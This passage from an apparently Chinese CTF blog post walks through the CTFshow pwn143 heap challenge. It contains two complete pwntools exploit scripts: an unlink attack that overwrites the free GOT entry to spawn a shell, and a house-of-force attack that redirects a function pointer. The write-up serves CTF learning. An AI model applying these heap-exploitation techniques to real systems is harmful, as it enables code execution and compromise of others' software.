dup吧，后续可以尝试。\n2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针\n![1741876735944.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png)\n3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。\n4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。\n\n## exp\n### unlink\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28159\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n\nflag=0x400D7F\nadd(0x60,b'aaaa') #0\nadd(0x90,b'bbbb') #1\nadd(0x80,b'cccc') #2\nadd(0x20,b'/bin/sh\\x00') #3\nptr=0x6020a8\nfd=ptr-0x18\nbk=ptr-0x10\nfake_chunk=p64(0)+p64(0x61)\nfake_chunk+=p64(fd)+p64(bk)\nfake_chunk+=p64(0)*8\nfake_chunk+=p64(0x60)+p64(0xa0)\n\nedit(0,len(fake_chunk),fake_chunk)\n#gdb.attach(io)\ndelete(1)\npayload=p64(0)+p64(0)+p64(0x90)+p64(elf.got['free'])\nedit(0,len(payload),payload)\n#gdb.attach(io)\nshow()\nio.recv(4)\nfree=u64(io.recv(6).ljust(8,b'\\x00'))\nlog.success(\"free-{}\".format(hex(free)))\nlibc=LibcSearcher(\"free\",free)\nlibcbase=free-libc.dump(\"free\")\nsystem=libcbase+libc.dump(\"system\")\ngdb.attach(io)\nedit(0,0x8,p64(system))\ndelete(3)\nio.interactive()\n```\n### house of force\n```python\nfrom pwn import *\nfrom libcfind import *\nfrom LibcSearcher import *\ncontext(os='linux',arch='amd64',log_level='debug')\nmode=0\nurl='pwn.challenge.ctf.show'\nport=28197\nelf=ELF(\"./pwn\")\nif mode == 0:\n    io=process(\"./pwn\")\nelse :\n    io=remote(url,port)\n\ndef add(size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"2\")\n    io.recvuntil(\"length:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef edit(idx,size,name):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"3\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\n    io.recvuntil(\"of name:\")\n    io.sendline(str(size))\n    io.recvuntil(\"name:\")\n    io.send(name)\n\ndef show():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"1\")\n   \ndef delete(idx):\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"4\")\n    io.recvuntil(\"index:\")\n    io.sendline(str(idx))\ndef get_flag():\n    io.recvuntil(\"Your choice:\")\n    io.sendline(\"5\")\nflag=0x400D7F\nadd(0x30,b'aaaa')\npayload=p64(0)*7+p64(0xffffffffffffffff)\n\nedit(0,0x41,payload)\n\noffset=-0x70\nadd(offset,b'aaaa')\n#gdb.attach(io)\nadd(0x10,p64(flag)*2)\nget_flag()\nio.interactive()\n```","slug":"heap/CTFshow pwn143","published":1,"date":"2025-06-22T12:08:58.255Z","updated":"2025-08-06T05:56:54.321Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2ia0012uomy7u8a8c99","content":"<h1 id=\"CTFshow-pwn143-unlink-houce-of-force\"><a href=\"#CTFshow-pwn143-unlink-houce-of-force\" class=\"headerlink\" title=\"CTFshow pwn143 (unlink &amp; houce of force)\"></a>CTFshow pwn143 (unlink &amp; houce of force)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png\" alt=\"1741875084264.png\"><br>1.经典菜单题<br>2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png\" alt=\"1741875249112.png\"><br>1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小<br>2.使用heaplist数组，保存堆块的地址</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png\" alt=\"1741875438296.png\"><br>1.发现溢出漏洞，可以溢出多字节</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png\" alt=\"1741875684508.png\"><br>1.没什么特别的，就是可以用来泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png\" alt=\"1741875887777.png\"><br>1.没有漏洞，释放后将指针置空了</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。<br>2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png\" alt=\"1741876735944.png\"><br>3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。<br>4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28159</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x60</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>) <span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x90</span>,<span class=\"string\">b&#x27;bbbb&#x27;</span>) <span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">b&#x27;cccc&#x27;</span>) <span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span>) <span class=\"comment\">#3</span></span><br><span class=\"line\">ptr=<span class=\"number\">0x6020a8</span></span><br><span class=\"line\">fd=ptr-<span class=\"number\">0x18</span></span><br><span class=\"line\">bk=ptr-<span class=\"number\">0x10</span></span><br><span class=\"line\">fake_chunk=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x61</span>)</span><br><span class=\"line\">fake_chunk+=p64(fd)+p64(bk)</span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0</span>)*<span class=\"number\">8</span></span><br><span class=\"line\">fake_chunk+=p64(<span class=\"number\">0x60</span>)+p64(<span class=\"number\">0xa0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(fake_chunk),fake_chunk)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">delete(<span class=\"number\">1</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x90</span>)+p64(elf.got[<span class=\"string\">&#x27;free&#x27;</span>])</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"built_in\">len</span>(payload),payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recv(<span class=\"number\">4</span>)</span><br><span class=\"line\">free=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;free-&#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">hex</span>(free)))</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;free&quot;</span>,free)</span><br><span class=\"line\">libcbase=free-libc.dump(<span class=\"string\">&quot;free&quot;</span>)</span><br><span class=\"line\">system=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x8</span>,p64(system))</span><br><span class=\"line\">delete(<span class=\"number\">3</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"house-of-force\"><a href=\"#house-of-force\" class=\"headerlink\" title=\"house of force\"></a>house of force</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28197</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;of name:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">   </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">delete</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;4&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_flag</span>():</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;5&quot;</span>)</span><br><span class=\"line\">flag=<span class=\"number\">0x400D7F</span></span><br><span class=\"line\">add(<span class=\"number\">0x30</span>,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">7</span>+p64(<span class=\"number\">0xffffffffffffffff</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x41</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">offset=-<span class=\"number\">0x70</span></span><br><span class=\"line\">add(offset,<span class=\"string\">b&#x27;aaaa&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,p64(flag)*<span class=\"number\">2</span>)</span><br><span class=\"line\">get_flag()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn143-unlink-houce-of-force\"><a href=\"#CTFshow-pwn143-unlink-houce-of-force\" class=\"headerlink\" title=\"CTFshow pwn143 (unlink &amp; houce of force)\"></a>CTFshow pwn143 (unlink &amp; houce of force)</h1><h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png\" alt=\"1741875084264.png\"><br>1.经典菜单题<br>2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数</p>\n<h3 id=\"add函数分析\"><a href=\"#add函数分析\" class=\"headerlink\" title=\"add函数分析\"></a>add函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png\" alt=\"1741875249112.png\"><br>1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小<br>2.使用heaplist数组，保存堆块的地址</p>\n<h3 id=\"edit函数分析\"><a href=\"#edit函数分析\" class=\"headerlink\" title=\"edit函数分析\"></a>edit函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png\" alt=\"1741875438296.png\"><br>1.发现溢出漏洞，可以溢出多字节</p>\n<h3 id=\"show函数分析\"><a href=\"#show函数分析\" class=\"headerlink\" title=\"show函数分析\"></a>show函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png\" alt=\"1741875684508.png\"><br>1.没什么特别的，就是可以用来泄露libc</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png\" alt=\"1741875887777.png\"><br>1.没有漏洞，释放后将指针置空了</p>\n<h2 id=\"构造思路\"><a href=\"#构造思路\" class=\"headerlink\" title=\"构造思路\"></a>构造思路</h2><p>1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。<br>2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png\" alt=\"1741876735944.png\"><br>3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。<br>4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> libcfind <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>,log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">mode=<span class=\"number\">0</span></span><br><span class=\"line\">url=<span class=\"string\">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class=\"line\">port=<span class=\"number\">28159</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">if</span> mode == <span class=\"number\">0</span>:</span><br><span class=\"line\">    io=process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span> :</span><br><span class=\"line\">    io=remote(url,port)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;length:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;name:&quot;</span>)</span><br><span class=\"line\">    io.send(name)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,size,name</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;Your choice:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">&quot;index:&quot;</span>)</span><br><span class=\"line\">    io.sendline(<span 